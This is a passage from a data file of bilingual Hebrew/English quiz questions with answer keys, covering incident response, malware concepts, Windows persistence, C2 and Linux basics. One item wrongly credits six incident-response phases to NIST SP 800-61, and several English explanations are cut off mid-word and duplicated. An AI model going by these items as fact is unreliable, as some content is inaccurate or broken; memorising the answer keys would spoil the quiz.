      explanationEn: "IR Lifecycle (NIST SP 800-61): 1) Preparation: runbooks, tools, training.\n\nMain Points:\n- 2) Identification: alert from SOC, EDR, or user report\n- 3) Containment: short-term (isolate) + long-term (patch)\n- 4) Eradication: remove malware, reset credentials",
      qEn: "What are the 6 NIST Incident Response phases?",
      correctEn: "Preparation > Identification > Containment > Eradication > Recovery > Lessons Learned",
      choicesEn: [
        "Preparation > Identification > Containment > Eradication > Recovery > Lessons Learned",
        "Discovery > Analysis > Mitigation > Reporting > Recovery > Review",
        "Alert > Triage > Isolation > Fix > Monitoring > Close",
        "Discovery > Escalation > Response > Patch > Test > Deploy"
      ]
    },
    {
      q: "\u200Fמה התקפת שרשרת אספקה? תן דוגמה ידועה.",
      correct: "\u200Fתקיפה דרך ספק או תוכנה מהימנה שהארגון משתמש בה\nSolarWinds: דלת אחורית בעדכון Orion\nשהתפשטה ל־18,000 לקוחות",
      choices: [
        "\u200Fתקיפה דרך ספק או תוכנה מהימנה שהארגון משתמש בה\nSolarWinds: דלת אחורית בעדכון Orion\nשהתפשטה ל־18,000 לקוחות",
        "\u200Fתקיפה על שרשרת לוגיסטיקה פיזית",
        "\u200Fתקיפת הזרקת SQL על מערכת ניהול שרשרת אספקה",
        "\u200Fתקיפה על עובדי חברה דרך אימייל פישינג"
      ],
      explanation: "‏‏ דוגמאות להתקפות שרשרת אספקה\n\nעיקרי:\n- SolarWinds SUNBURST 2020\n- דלת אחורית ב־DLL → 18,000 לקוחות\n- XZ Utils 2024\n\nטיפ:\nסריקת תלויות",
      explanationEn: "Supply Chain Attack examples: 1) SolarWinds SUNBURST 2020 — a backdoor in a DLL spread to 18,000 customers.\n\nMain Points:\n- 2) XZ Utils 2024 — backdoor in a compression library\n- 3) npm malicious packages\n- 4) Codecov breach — CI/CD script was compromised",
      qEn: "What is a Supply Chain Attack? Give a well-known example.",
      correctEn: "An attack through a trusted vendor or software used by the organization\nSolarWinds: a backdoor in an Orion update\nthat spread to 18,000 customers",
      choicesEn: [
        "An attack through a trusted vendor or software used by the organization\nSolarWinds: a backdoor in an Orion update\nthat spread to 18,000 customers",
        "An attack on a physical logistics supply chain",
        "SQL injection on a supply chain management system",
        "An attack on company employees through phishing email"
      ]
    },
    {
      q: "\u200Fמה Volatility ולמה משתמשים בו בתגובה לאירועים?",
      correct: "\u200Fכלי לניתוח תמונות זיכרון (memory dumps)\nמזהה תהליכים, חיבורי רשת\nונוזקה מוסתרת בזיכרון",
      choices: [
        "\u200Fכלי לניתוח תמונות זיכרון (memory dumps)\nמזהה תהליכים, חיבורי רשת\nונוזקה מוסתרת בזיכרון",
        "\u200Fכלי לניהול אחסון נדיף בענן",
        "\u200Fמערכת SIEM לניתוח לוגים בזמן אמת",
        "\u200Fכלי לסימולציה של התקפות APT"
      ],
      explanation: "‏‏ למה Volatility?\n\nעיקרי:\n- נוזקה ללא קבצים (fileless) רצה רק בזיכרון\n- אנטי-וירוס רגיל לא מוצא אותה\n- פקודות מועילות\n\nטיפ:\nVMware snapshot",
      explanationEn: "Memory forensics: malware that runs only in RAM (fileless malware) never writes to disk — only memory analysis tools like Volatility can detect it.\n\nMain Points:\n- Useful commands: pslist (processes), netscan (connections), malfind (DLL injection, hollowing), cmdline (process arguments), hashdump (Windows password hashes)\n- Memory capture tools: WinPMem, Magnet RAM Capture, VMware snapshots",
      qEn: "What is Volatility and why is it used in Incident Response?",
      correctEn: "A tool for analyzing memory dumps\nIdentifies processes, network connections\nand hidden malware in memory",
      choicesEn: [
        "A tool for analyzing memory dumps\nIdentifies processes, network connections\nand hidden malware in memory",
        "A tool for managing volatile cloud storage",
        "A SIEM system for real-time log analysis",
        "A tool for simulating APT attacks"
      ]
    },
    {
      q: "\u200Fלמה אסור לכבות מחשב נגוע באירוע אבטחה?",
      correct: "\u200FRAM מכיל ראיות קריטיות — תהליכים רצים, מפתחות הצפנה, חיבורי C2\nכיבוי מוחק את כל הזיכרון הנדיף",
      choices: [
        "\u200FRAM מכיל ראיות קריטיות — תהליכים רצים, מפתחות הצפנה, חיבורי C2\nכיבוי מוחק את כל הזיכרון הנדיף",
        "\u200Fכי המחשב עלול להתפוצץ\nאם יש בו Ransomware פעיל",
        "\u200Fכי Windows Update עלול להתקין עדכונים\nשימחקו את הנוזקה",
        "\u200Fכי התוקף יקבל הודעה\nשהמחשב כבה ויברח"
      ],
      explanation: "\u200FMemory forensics תלוי ב-RAM חי.\n\nעיקרי:\n- Volatility יכול לחלץ: תהליכים, חיבורי רשת, מפתחות הצפנה\n- כיבוי = מחיקת כל הראיות מה-RAM\n- פעולה נכונה: memory dump \u2190 ניתוק רשת \u2190 חקירה\n\nטיפ:\nRAM = סצנת פשע — אל תנקה לפני שאוספים ראיות",
      explanationEn: "Memory forensics depends on live RAM.\n\nMain Points:\n- Volatility can extract: processes, network connections, encryption keys\n- Shutdown = erasing all evidence from RAM\n- Correct action: memory dump, then network isolation, then investigation\n\nTip:\nRAM = crime scene — don't clean up before collecting evidence",
      qEn: "Why should you NOT shut down an infected computer during a security incident?",
      correctEn: "RAM contains critical evidence — running processes, encryption keys, C2 connections\nShutdown erases all volatile memory",
      choicesEn: [
        "RAM contains critical evidence — running processes, encryption keys, C2 connections\nShutdown erases all volatile memory",
        "Because the computer might explode\nIf it has active Ransomware",
        "Because Windows Update might install patches\nThat delete the malware",
        "Because the attacker will get notified\nThat the computer was shut down and will flee"
      ]
    }
  ],

  115: [
    {
      q: "\u200Fמה ההבדל בין ניתוח נוזקה סטטי לדינמי?",
      correct: "\u200Fסטטי: בוחנים קובץ ללא הרצה\n(מחרוזות, ייבואים)\nדינמי: מריצים בסביבה מבודדת\nובוחנים התנהגות",
      choices: [
        "\u200Fסטטי: בוחנים קובץ ללא הרצה\n(מחרוזות, ייבואים)\nדינמי: מריצים בסביבה מבודדת\nובוחנים התנהגות",
        "\u200Fסטטי = ניתוח בזמן אמת\nדינמי = ניתוח לאחר פריצה",
        "\u200Fסטטי = במכונה וירטואלית\nדינמי = על חומרה פיזית",
        "\u200Fסטטי = כלי Linux\nדינמי = כלי Windows"
      ],
      explanation: "‏‏ ניתוח סטטי\n\nעיקרי:\n- כלים: strings, PEStudio, Ghidra\n- מגלה מחרוזות קריאות (URL, IP)\n- ספריות מיובאות, חריגות בכותרת PE\n\nטיפ:\nשילוב שניהם = ניתוח מלא",
      explanationEn: "Static analysis: tools like strings, PEStudio, Ghidra.\n\nMain Points:\n- Reveals: readable strings (URLs, IPs), imported DLLs, PE header anomalies\n- Limited by obfuscation/packing\n- Dynamic analysis: Cuckoo Sandbox, Process Monitor, Wireshark",
      qEn: "What is the difference between static and dynamic malware analysis?",
      correctEn: "Static: examining a file without running it\n(strings, imports)\nDynamic: running in an isolated environment\nand examining behavior",
      choicesEn: [
        "Static: examining a file without running it\n(strings, imports)\nDynamic: running in an isolated environment\nand examining behavior",
        "Static = real-time analysis\nDynamic = post-breach analysis",
        "Static = in a virtual machine\nDynamic = on physical hardware",
        "Static = Linux tools\nDynamic = Windows tools"
      ]
    },
    {
      q: "\u200Fמה כופרה (Ransomware) ואיך מתגוננים?",
      correct: "\u200Fנוזקה שמצפינה קבצים ודורשת כופר\nהגנה: גיבויים מנותקים, עדכוני אבטחה\nסינון אימייל, פילוח רשת",
      choices: [
        "\u200Fנוזקה שמצפינה קבצים ודורשת כופר\nהגנה: גיבויים מנותקים, עדכוני אבטחה\nסינון אימייל, פילוח רשת",
        "\u200Fנוזקה שגונבת נתונים ומוכרת לדארקנט",
        "\u200Fכלי לגיטימי להצפנת קבצים לאבטחה",
        "\u200Fוירוס שמשתמש במעבד לכריית מטבעות"
      ],
      explanation: "‏‏ שרשרת ההתקפה\n\nעיקרי:\n- פישינג → גישה ראשונית\n- הסלמת הרשאות → תנועה רוחבית\n- חילוץ נתונים → הצפנה\n\nטיפ:\nמערכת EDR + סינון אימייל",
      explanationEn: "Ransomware kill chain: Phishing > Initial Access > Privilege Escalation > Lateral Movement > Data Exfiltration > Encryption.\n\nMain Points:\n- RaaS (Ransomware-as-a-Service): LockBit, BlackCat\n- Defense: 3-2-1 backup rule (3 copies, 2 media types, 1 offsite/offline), immutable backups (Veeam, Azure Immutable), Endpoint Detection & Response (EDR), and email gateway filtering",
      qEn: "What is Ransomware and how do you defend against it?",
      correctEn: "Malware that encrypts files and demands a ransom\nDefense: offline backups, security patches\nemail filtering, network segmentation",
      choicesEn: [
        "Malware that encrypts files and demands a ransom\nDefense: offline backups, security patches\nemail filtering, network segmentation",
        "Malware that steals data and sells it on the darknet",
        "A legitimate tool for encrypting files for security",
        "A virus that uses the CPU to mine cryptocurrency"
      ]
    },
    {
      q: "\u200Fמהם מנגנוני עמידות (Persistence) נפוצים ב־Windows?",
      correct: "\u200Fמפתחות Run ב־Registry\nמשימות מתוזמנות, שירותים\nתיקיית Startup, חטיפת DLL\nנוזקה שרצה אחרי אתחול",
      choices: [
        "\u200Fמפתחות Run ב־Registry\nמשימות מתוזמנות, שירותים\nתיקיית Startup, חטיפת DLL\nנוזקה שרצה אחרי אתחול",
        "\u200FWMI Events, DCOM ו־BITS Jobs בלבד",
        "\u200Fרק crontab ו-systemd (של Linux)",
        "\u200Fתוספי דפדפן בלבד"
      ],
      explanation: "‏‏ מנגנוני עמידות ב־Windows\n\nעיקרי:\n- מפתחות Run ב־Registry\n- משימות מתוזמנות (schtasks)\n- שירותים (sc create)\n\nטיפ:\nכל רשומת startup צריכה אימות ידני",
      explanationEn: "Windows Persistence mechanisms: 1) Registry Run Keys (HKCU/HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run).\n\nMain Points:\n- 2) Scheduled Tasks: schtasks /create\n- 3) Services: sc create\n- 4) DLL Hijacking: placing a malicious DLL in the path before the legitimate one",
      qEn: "What are common Persistence mechanisms in Windows?",
      correctEn: "Registry Run keys\nScheduled Tasks, Services\nStartup folder, DLL Hijacking\nMalware that runs after reboot",
      choicesEn: [
        "Registry Run keys\nScheduled Tasks, Services\nStartup folder, DLL Hijacking\nMalware that runs after reboot",
        "WMI Events, DCOM, and BITS Jobs only",
        "Only crontab and systemd (Linux)",
        "Browser extensions only"
      ]
    },
    {
      q: "\u200Fמה C2 (שליטה ובקרה) בנוזקה?",
      correct: "\u200Fתשתית תקשורת בין הנוזקה לתוקף\nמאפשרת שליחת פקודות\nגניבת נתונים ועדכוני נוזקה",
      choices: [
        "\u200Fתשתית תקשורת בין הנוזקה לתוקף\nמאפשרת שליחת פקודות\nגניבת נתונים ועדכוני נוזקה",
        "\u200Fשליטה ובקרה = ניהול מנהל מערכת",
        "\u200Fתוכנה לשליטה בתהליכי CI/CD",
        "\u200Fחומת אש שמנתבת חבילות"
      ],
      explanation: "‏‏ ערוצי C2 נפוצים\n\nעיקרי:\n- HTTP/HTTPS — מתחזה לתעבורה רגילה\n- DNS — ערוץ חשאי בשאילתות\n- ICMP\n\nטיפ:\nBrute Ratel",
      explanationEn: "C2 (Command and Control) channels: HTTP/HTTPS (camouflaged as web traffic), DNS (covert channel in DNS queries), ICMP, Twitter/Slack (social media C2).\n\nMain Points:\n- Detection: suspicious beacon intervals (malware phones home every X seconds), rare domains, DNS DGA (Domain Generation Algorithm — malware generates random domain names)\n- Tools: Cobalt Strike, Covenant, Brute Ratel",
      qEn: "What is C2 (Command and Control) in malware?",
      correctEn: "Communication infrastructure between the malware and the attacker\nAllows sending commands\nstealing data, and updating malware",
      choicesEn: [
        "Communication infrastructure between the malware and the attacker\nAllows sending commands\nstealing data, and updating malware",
        "Command and Control = system administration management",
        "Software for controlling CI/CD processes",
        "A firewall that routes packets"
      ]
    },
    {
      q: "\u200Fמה נוזקה ללא קבצים (fileless) ולמה קשה לאתר?",
      correct: "\u200Fנוזקה שרצה רק בזיכרון ולא כותבת לדיסק\nאנטי-וירוס שסורק קבצים לא מוצא אותה\nרק חקירת זיכרון מגלה",
      choices: [
        "\u200Fנוזקה שרצה רק בזיכרון ולא כותבת לדיסק\nאנטי-וירוס שסורק קבצים לא מוצא אותה\nרק חקירת זיכרון מגלה",
        "\u200Fנוזקה שמוחקת את עצמה אחרי ריצה",
        "\u200Fנוזקה שמסתירה את הסיומת של הקובץ שלה",
        "\u200Fנוזקה שפועלת בהרשאות נמוכות ללא מנהל"
      ],
      explanation: "‏‏ טכניקות\n\nעיקרי:\n- PowerShell — טעינת קוד רפלקטיבית\n- WMI\n- החלפת תהליך (Process Hollowing)\n\nטיפ:\nחקירת זיכרון עם Volatility מגלה קוד מוזרק",
      explanationEn: "Fileless malware techniques: PowerShell (reflective loading), WMI, Process Hollowing (replacing a legitimate process with malware), DLL Injection.\n\nMain Points:\n- Example: PowerShell -EncodedCommand <base64> executes a payload directly in RAM\n- Detection: EDR checks behavior, not just files\n- AMSI (Antimalware Scan Interface) scans PowerShell scripts",
      qEn: "What is fileless malware and why is it hard to detect?",
      correctEn: "Malware that runs only in memory and does not write to disk\nAntivirus that scans files cannot find it\nOnly memory forensics can detect it",
      choicesEn: [
        "Malware that runs only in memory and does not write to disk\nAntivirus that scans files cannot find it\nOnly memory forensics can detect it",
        "Malware that deletes itself after running",
        "Malware that hides its file extension",
        "Malware that runs with low privileges without admin"
      ]
    }
  ],

  // ============================================================
  // Linux Track — Chapters 401-410
  // ============================================================

  401: [
    {
      q: "\u200Fמה תפקיד ה־Kernel (גרעין) במערכת לינוקס?",
      correct: "\u200Fמנהל חומרה, זיכרון, תהליכים ורשת\nהוא הלב של מערכת ההפעלה",
      choices: [
        "\u200Fמנהל חומרה, זיכרון, תהליכים ורשת\nהוא הלב של מערכת ההפעלה",
        "\u200Fמספק ממשק גרפי למשתמש",
        "\u200Fמנהל חבילות ותוכנות מותקנות",
        "\u200Fמספק שורת פקודה בלבד"
      ],
      explanation: "‏ה־Kernel הוא גרעין מערכת ההפעלה — השכבה שיושבת בין האפליקציות לחומרה.\n\nעיקרי:\n- הוא מנהל את כל המשאבים: CPU, זיכרון, דיסקים, רשת",
      explanationEn: "The Kernel is the core of the OS — it sits between applications and hardware, managing all resources: CPU, memory, disks, and network..\n\nMain Points:\n- The Kernel is the core of the OS — it sits between applicati",
      qEn: "What is the role of the Kernel in a Linux system?",
      correctEn: "Manages hardware, memory, processes, and network\nIt is the heart of the operating system",
      choicesEn: [
        "Manages hardware, memory, processes, and network\nIt is the heart of the operating system",
        "Provides a graphical user interface",
        "Manages packages and installed software",
        "Provides only a command-line interface"
      ]
    },
    {
      q: "\u200Fאיזו הפצת לינוקס מומלצת לבדיקות חדירה ואבטחת מידע?",
      correct: "\u200FKali Linux — מגיעה עם מאות כלי האקינג מותקנים",
      choices: [
        "\u200FKali Linux — מגיעה עם מאות כלי האקינג מותקנים",
        "\u200FUbuntu — ההפצה הפופולרית ביותר",
        "\u200FFedora — מעבדת הניסויים של Red Hat",
        "\u200FDebian — ההפצה היציבה ביותר"
      ],
      explanation: "‏Kali Linux היא הפצה ייעודית ל־Penetration Testing.\n\nעיקרי:\n- מגיעה עם כלים כמו Nmap, Wireshark, Metasploit ועוד מאות כלי אבטחה מותקנים",
      explanationEn: "Kali Linux is a distribution dedicated to penetration testing.\n\nMain Points:\n- It comes with tools like Nmap, Wireshark, Metasploit, and hundreds of other pre-installed security tools",
      qEn: "Which Linux distribution is recommended for penetration testing and security?",
      correctEn: "Kali Linux — comes with hundreds of pre-installed hacking tools",
      choicesEn: [
        "Kali Linux — comes with hundreds of pre-installed hacking tools",
        "Ubuntu — the most popular distribution",
        "Fedora — Red Hat's experimental lab",
        "Debian — the most stable distribution"
      ]
    },
    {
      q: "\u200Fמה נמצא בתיקיית /etc בלינוקס?",
      correct: "\u200Fקבצי הגדרות של המערכת — רשת, סיסמאות, שירותים",
      choices: [
        "\u200Fקבצי הגדרות של המערכת — רשת, סיסמאות, שירותים",
        "\u200Fקבצים זמניים שנמחקים בהפעלה מחדש",
        "\u200Fתיקיות הבית של המשתמשים",
        "\u200Fתוכנות ופקודות בסיסיות"
      ],
      explanation: "‏/etc מכילה את קבצי ההגדרות (configuration)\n\nעיקרי:\n- של המערכת — כמו /etc/passwd (משתמשים)\n- /etc/hosts (רשת)\n- /etc/ssh/sshd_config (SSH).",
      explanationEn: "/etc contains system configuration files — like /etc/passwd (users), /etc/hosts (network), /etc/ssh/sshd_config (SSH)..\n\nMain Points:\n- /etc contains system configuration files — like /etc/passwd ",
      qEn: "What is stored in the /etc directory in Linux?",
      correctEn: "System configuration files — network, passwords, services",
      choicesEn: [
        "System configuration files — network, passwords, services",
        "Temporary files deleted on reboot",
        "User home directories",
        "Basic programs and commands"
      ]
    },
    {
      q: "\u200Fלמה שרתי ייצור בלינוקס בדרך כלל לא מתקינים ממשק גרפי (GUI)?",
      correct: "\u200FGUI צורך משאבים מיותרים, מגדיל שטח התקפה\nושרתים מנוהלים דרך SSH ו־Terminal",
      choices: [
        "\u200FGUI צורך משאבים מיותרים, מגדיל שטח התקפה\nושרתים מנוהלים דרך SSH ו־Terminal",
        "\u200Fלינוקס לא תומך בממשק גרפי",
        "\u200Fממשק גרפי לא עובד דרך רשת",
        "\u200Fהממשק הגרפי בלינוקס לא יציב"
      ],
      explanation: "‏שרתים לא צריכים מסך — מנהלים אותם מרחוק עם SSH.\n\nעיקרי:\n- GUI צורך CPU וזיכרון שעדיפים לשירותים\n- בנוסף, פחות תוכנות = פחות פגיעויות אבטחה",
      explanationEn: "Servers don't need a screen — they're managed remotely via SSH.\n\nMain Points:\n- GUI consumes CPU and memory better used for services\n- Also, fewer programs = fewer security vulnerabilities",
      qEn: "Why don't production Linux servers usually install a GUI?",
      correctEn: "GUI wastes resources, increases attack surface\nand servers are managed via SSH and Terminal",
      choicesEn: [
        "GUI wastes resources, increases attack surface\nand servers are managed via SSH and Terminal",
        "Linux doesn't support graphical interfaces",
        "Graphical interfaces don't work over network",
        "The Linux GUI is not stable"
      ]
    },
    {
      q: "\u200Fמה מסמל הסימן $ בשורת הפקודה לעומת #?",
      correct: "\u200F$ = משתמש רגיל\n# = root (מנהל מערכת)",
      choices: [
        "\u200F$ = משתמש רגיל\n# = root (מנהל מערכת)",
        "\u200F$ = root\n# = הערה בסקריפט",
        "\u200Fשניהם מסמלים את אותו הדבר",
        "\u200F$ = פקודה חדשה\n# = המשך פקודה קודמת"
      ],
      explanation: "‏ה-prompt בלינוקס מציג $ למשתמש רגיל ו-# ל-root.\n\nעיקרי:\n- עבודה כ-root מסוכנת — תמיד עדיף לעבוד כמשתמש רגיל ולהשתמש ב-sudo כשצריך",
      explanationEn: "The Linux prompt shows $ for a regular user and # for root.\n\nMain Points:\n- Working as root is dangerous — always work as a regular user and use sudo when needed",
      qEn: "What does the $ symbol mean in the command prompt compared to #?",
      correctEn: "$ = regular user\n# = root (system administrator)",
      choicesEn: [
        "$ = regular user\n# = root (system administrator)",
        "$ = root\n# = comment in script",
        "Both mean the same thing",
        "$ = new command\n# = continuation of previous command"
      ]
    }
  ],

  402: [
    {
      q: "\u200Fמה ההבדל בין > לבין >> בהפניית פלט?",
      correct: "\u200F> מוחק את תוכן הקובץ וכותב מחדש\n>> מוסיף לסוף הקובץ בלי למחוק",
      choices: [
        "\u200F> מוחק את תוכן הקובץ וכותב מחדש\n>> מוסיף לסוף הקובץ בלי למחוק",
        "\u200F> מוסיף לקובץ\n>> מוחק וכותב מחדש",
        "\u200F> כותב לקובץ\n>> כותב לשני קבצים",
        "\u200F> עובד עם טקסט\n>> עובד עם בינארי"
      ],
      explanation: "‏לדוגמה: echo 'hello' > file.txt ימחק את התוכן הקיים וישים רק 'hello'.\n\nעיקרי:\n- echo 'world' >> file.txt יוסיף 'world' אחרי 'hello'",
      explanationEn: "For example: echo 'hello' > file.txt erases existing content and puts only 'hello'.\n\nMain Points:\n- echo 'world' >> file.txt appends 'world' after 'hello'",
      qEn: "What is the difference between > and >> in output redirection?",
      correctEn: "> overwrites the file content\n>> appends to the end without deleting",
      choicesEn: [
        "> overwrites the file content\n>> appends to the end without deleting",
        "> appends to file\n>> overwrites",
        "> writes to file\n>> writes to two files",
        "> works with text\n>> works with binary"
      ]
    },
    {
      q: "\u200Fמה עושה הדגל -r בפקודת grep?",
      correct: "\u200Fמחפש רקורסיבית בכל הקבצים בתיקייה ותת-תיקיות",
      choices: [
        "\u200Fמחפש רקורסיבית בכל הקבצים בתיקייה ותת-תיקיות",
        "\u200Fמחפש בסדר הפוך מסוף הקובץ",
        "\u200Fמציג את השורות שלא מתאימות",
        "\u200Fמחפש ביטוי רגולרי מורחב"
      ],
      explanation: "‏grep -r 'error' /var/log/ יחפש את המילה 'error' בכל הקבצים תחת /var/log/ כולל תת-תיקיות.\n\nעיקרי:\n- grep -r 'error' /var/log/ יחפש את המילה 'error' בכל הקבצים ת",
      explanationEn: "grep -r 'error' /var/log/ searches for 'error' in all files under /var/log/ including subdirectories..\n\nMain Points:\n- grep -r 'error' /var/log/ searches for 'error' in all files ",
      qEn: "What does the -r flag do in the grep command?",
      correctEn: "Searches recursively in all files in directory and subdirectories",
      choicesEn: [
        "Searches recursively in all files in directory and subdirectories",
        "Searches in reverse order from end of file",
        "Shows lines that don't match",
        "Searches with extended regular expressions"
      ]
    },
    {
      q: "\u200Fמה עושה הסימן | (pipe) בלינוקס?",
      correct: "\u200Fמעביר את הפלט של פקודה אחת כקלט לפקודה הבאה",
      choices: [
        "\u200Fמעביר את הפלט של פקודה אחת כקלט לפקודה הבאה",
        "\u200Fמריץ שתי פקודות במקביל",
        "\u200Fכותב פלט לקובץ",
        "\u200Fמפריד בין שני נתיבים"
      ],
      explanation: "‏לדוגמה\n\nעיקרי:\n- ps aux | grep nginx — הפלט של ps aux (כל התהליכים)\n- עובר לgrep שמסנן רק שורות עם nginx.",
      explanationEn: "For example: ps aux | grep nginx — the output of ps aux (all processes) is passed to grep which filters only lines containing nginx..\n\nMain Points:\n- For example: ps aux | grep nginx — the output of ps aux (all",
      qEn: "What does the | (pipe) symbol do in Linux?",
      correctEn: "Passes the output of one command as input to the next command",
      choicesEn: [
        "Passes the output of one command as input to the next command",
        "Runs two commands in parallel",
        "Writes output to a file",
        "Separates two paths"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין find לבין locate?",
      correct: "\u200Ffind מחפש בזמן אמת (איטי אבל מעודכן)\nlocate מחפש במאגר מאונדקס (מהיר אבל צריך updatedb)",
      choices: [
        "\u200Ffind מחפש בזמן אמת (איטי אבל מעודכן)\nlocate מחפש במאגר מאונדקס (מהיר אבל צריך updatedb)",
        "\u200Ffind מחפש טקסט בקבצים\nlocate מחפש שמות קבצים",
        "\u200Ffind עובד רק על קבצים\nlocate עובד גם על תיקיות",
        "\u200Fאין הבדל — שתיהן זהות"
      ],
      explanation: "‏find סורק את מערכת הקבצים בזמן אמת — איטי אבל תמיד מעודכן.\n\nעיקרי:\n- locate מחפש במאגר שנבנה עם sudo updatedb — מהיר מאוד אבל יכול להחזיר תוצאות לא עדכניות",
      explanationEn: "find scans the filesystem in real-time — slow but always current.\n\nMain Points:\n- locate searches a database built with sudo updatedb — very fast but may return outdated results",
      qEn: "What is the difference between find and locate?",
      correctEn: "find searches in real-time (slow but current)\nlocate searches an indexed database (fast but needs updatedb)",
      choicesEn: [
        "find searches in real-time (slow but current)\nlocate searches an indexed database (fast but needs updatedb)",
        "find searches text inside files\nlocate searches file names",
        "find works only on files\nlocate works on directories too",
        "No difference — both are identical"
      ]
    },
    {
      q: "\u200Fמה עושה הפקודה mkdir -p projects/web/frontend?",
      correct: "\u200Fיוצרת את כל שרשרת התיקיות — כולל תיקיות אב שלא קיימות",
      choices: [
        "\u200Fיוצרת את כל שרשרת התיקיות — כולל תיקיות אב שלא קיימות",
        "\u200Fיוצרת רק את התיקייה האחרונה (frontend)",
        "\u200Fמוחקת תיקיות קיימות ויוצרת חדשות",
        "\u200Fיוצרת תיקייה עם הרשאות מיוחדות"
      ],
      explanation: "‏הדגל -p (parents) אומר ל-mkdir ליצור גם תיקיות אב שלא קיימות.\n\nעיקרי:\n- בלי -p, אם projects לא קיימת, הפקודה תיכשל",
      explanationEn: "The -p (parents) flag tells mkdir to also create parent directories that don't exist.\n\nMain Points:\n- Without -p, if projects doesn't exist, the command fails",
      qEn: "What does mkdir -p projects/web/frontend do?",
      correctEn: "Creates the entire directory chain — including parent directories that don't exist",
      choicesEn: [
        "Creates the entire directory chain — including parent directories that don't exist",
        "Creates only the last directory (frontend)",
        "Deletes existing directories and creates new ones",
        "Creates a directory with special permissions"
      ]
    },
    {
      q: "\u200Fמה עושה הפקודה wc -l /var/log/syslog?",
      correct: "\u200Fמציגה את מספר השורות בקובץ syslog",
      choices: [
        "\u200Fמציגה את מספר השורות בקובץ syslog",
        "\u200Fמציגה את מספר המילים בקובץ",
        "\u200Fמציגה את גודל הקובץ בבתים",
        "\u200Fמציגה את 10 השורות האחרונות"
      ],
      explanation: "‏wc = Word Count.\n\nעיקרי:\n- הדגל -l סופר שורות בלבד\n- בלי דגלים, wc מציג שורות, מילים ותווים",
      explanationEn: "wc = Word Count.\n\nMain Points:\n- The -l flag counts lines only\n- Without flags, wc shows lines, words, and characters",
      qEn: "What does the command wc -l /var/log/syslog do?",
      correctEn: "Displays the number of lines in the syslog file",
      choicesEn: [
        "Displays the number of lines in the syslog file",
        "Displays the number of words in the file",
        "Displays the file size in bytes",
        "Displays the last 10 lines"
      ]
    }
  ],

  403: [
    {
      q: "\u200Fמה מייצג הערך 755 בפקודת chmod?",
      correct: "\u200Fבעלים: קריאה+כתיבה+הרצה (7)\nקבוצה ואחרים: קריאה+הרצה (5)",
      choices: [
        "\u200Fבעלים: קריאה+כתיבה+הרצה (7)\nקבוצה ואחרים: קריאה+הרצה (5)",
        "\u200Fכולם יכולים לקרוא, לכתוב ולהריץ",
        "\u200Fרק הבעלים יכול לגשת לקובץ",
        "\u200Fקריאה בלבד לכולם"
      ],
      explanation: "‏בשיטה המספרית: r=4, w=2, x=1.\n\nעיקרי:\n- אז 7=rwx, 5=r-x\n- הסדר: בעלים|קבוצה|אחרים\n- 755 נפוץ לסקריפטים ותיקיות",
      explanationEn: "In octal notation: r=4, w=2, x=1.\n\nMain Points:\n- So 7=rwx, 5=r-x\n- Order: owner|group|others\n- 755 is common for scripts and directories",
      qEn: "What does the value 755 represent in chmod?",
      correctEn: "Owner: read+write+execute (7)\nGroup and others: read+execute (5)",
      choicesEn: [
        "Owner: read+write+execute (7)\nGroup and others: read+execute (5)",
        "Everyone can read, write, and execute",
        "Only the owner can access the file",
        "Read-only for everyone"
      ]
    },
    {
      q: "\u200Fמה עושה SUID ולמה הוא עלול להיות מסוכן?",
      correct: "\u200Fגורם לקובץ לרוץ עם הרשאות הבעלים שלו\nמסוכן כי פגיעות בתוכנה עם SUID של root = הרשאות root לתוקף",
      choices: [
        "\u200Fגורם לקובץ לרוץ עם הרשאות הבעלים שלו\nמסוכן כי פגיעות בתוכנה עם SUID של root = הרשאות root לתוקף",
        "\u200Fמסתיר קובץ מפני משתמשים רגילים",
        "\u200Fמונע מחיקה של קובץ על ידי אחרים",
        "\u200Fמצפין את תוכן הקובץ"
      ],
      explanation: "‏דוגמה: /usr/bin/passwd שייך ל-root ויש לו SUID — כך כל משתמש יכול לשנות את הסיסמה שלו.\n\nעיקרי:\n- אם תוקף ימצא באג בתוכנה כזו — הוא מקבל root",
      explanationEn: "Example: /usr/bin/passwd is owned by root with SUID — so any user can change their password.\n\nMain Points:\n- If an attacker finds a bug in such a program, they get root access",
      qEn: "What does SUID do and why can it be dangerous?",
      correctEn: "Makes a file run with its owner's permissions\nDangerous because a vulnerability in a SUID root program = root access for attacker",
      choicesEn: [
        "Makes a file run with its owner's permissions\nDangerous because a vulnerability in a SUID root program = root access for attacker",
        "Hides a file from regular users",
        "Prevents deletion of a file by others",
        "Encrypts the file content"
      ]
    },
    {
      q: "\u200Fלמה חשוב להשתמש ב-visudo ולא לערוך ישירות את /etc/sudoers?",
      correct: "\u200Fvisudo בודק שגיאות תחביר לפני שמירה\nשגיאה ב-sudoers יכולה לנעול אתכם מחוץ למערכת",
      choices: [
        "\u200Fvisudo בודק שגיאות תחביר לפני שמירה\nשגיאה ב-sudoers יכולה לנעול אתכם מחוץ למערכת",
        "\u200Fvisudo מצפין את הקובץ",
        "\u200Fvisudo יוצר גיבוי אוטומטי",
        "\u200Fvisudo מאפשר עריכה מרובת משתמשים"
      ],
      explanation: "‏אם עורכים sudoers ישירות ויש שגיאת תחביר — sudo יפסיק לעבוד.\n\nעיקרי:\n- לא תוכלו לתקן כי צריך sudo כדי לערוך את הקובץ\n- visudo מונע מצב כזה",
      explanationEn: "If you edit sudoers directly and there's a syntax error, sudo stops working.\n\nMain Points:\n- You can't fix it because you need sudo to edit the file\n- visudo prevents this situation",
      qEn: "Why is it important to use visudo instead of editing /etc/sudoers directly?",
      correctEn: "visudo checks for syntax errors before saving\nAn error in sudoers can lock you out of the system",
      choicesEn: [
        "visudo checks for syntax errors before saving\nAn error in sudoers can lock you out of the system",
        "visudo encrypts the file",
        "visudo creates an automatic backup",
        "visudo allows multi-user editing"
      ]
    },
    {
      q: "\u200Fמה תפקיד Sticky Bit ואיפה רואים אותו בפועל?",
      correct: "\u200Fרק בעלים של קובץ (או root) יכול למחוק אותו\nדוגמה: /tmp — כולם כותבים אבל לא מוחקים של אחרים",
      choices: [
        "\u200Fרק בעלים של קובץ (או root) יכול למחוק אותו\nדוגמה: /tmp — כולם כותבים אבל לא מוחקים של אחרים",
        "\u200Fמונע שינוי הרשאות על קובץ",
        "\u200Fמסתיר קובץ מתוך ls",
        "\u200Fגורם לקובץ להישאר בזיכרון"
      ],
